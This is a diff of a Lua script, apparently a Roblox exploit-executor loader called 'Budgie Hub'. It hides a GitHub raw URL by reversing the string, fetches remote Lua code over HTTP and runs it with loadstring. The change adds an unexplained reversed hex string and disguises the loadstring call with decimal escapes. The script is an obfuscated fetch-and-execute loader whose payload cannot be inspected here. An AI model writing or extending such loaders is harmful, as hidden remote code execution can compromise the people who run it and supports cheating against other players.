@@ -1,4 +1,15 @@
-local reverse = (string and typeof(string) == [[table]] and rawget(string, [[reverse]]) and string.reverse) and clonefunction(([[text]]).reverse)
+------------------------------------------------------[[
+
+ ____            _       _        _   _       _     
+| __ ) _   _  __| | __ _(_) ___  | | | |_   _| |__  
+|  _ \| | | |/ _` |/ _` | |/ _ \ | |_| | | | | '_ \ 
+| |_) | |_| | (_| | (_| | |  __/ |  _  | |_| | |_) |
+|____/ \__,_|\__,_|\__, |_|\___| |_| |_|\__,_|_.__/ 
+                   |___/                            
+
+]]-----------------------------------------------------
+
+local reverse, hex = (string and typeof(string) == [[table]] and rawget(string, [[reverse]]) and string.reverse) and clonefunction(([[text]]).reverse), "1657c6e247079627363523558424f2e69616d6f23746165686f237665627f2473656a6f6270523558424f2c61636966666f42756b4354414f2d6f636e247e65647e6f63627563757265786479676e2771627f2f2a33707474786"
 local request, link = (request and typeof(request) == "function" and request) or (syn and rawget(syn, [[request]])) or (http and rawget(http, [[request]])) or (fluxus and rawget(fluxus, [[request]])) or newcclosure(function(options) return clonefunction(game.GetService(game, "HttpService").RequestAsync)(game.HttpService, options) end), reverse([[aul.tpircS2UHB/niam/sdaeh/sfer/tcejorP2UHB/laciffOreKSDA/moc.tnetnocresubuhtig.war//:sptth]])
 local loadstrin = (getgenv and typeof(getgenv) == [[function]] and typeof(getgenv()) == [[table]] and rawget(getgenv(), [[loadstring]]) and getgenv().loadstring ~= nil and getgenv().loadstring) or (loadstring and clonefunction(loadstring))
-loadstrin(request({Url = reverse(reverse(link)); Method = [[GET]]}).Body)()
+loadstring("return \108\111\97\100\115\116\114\105\110\103")()(request({Url = reverse(reverse(link)); Method = [[GET]]}).Body)()
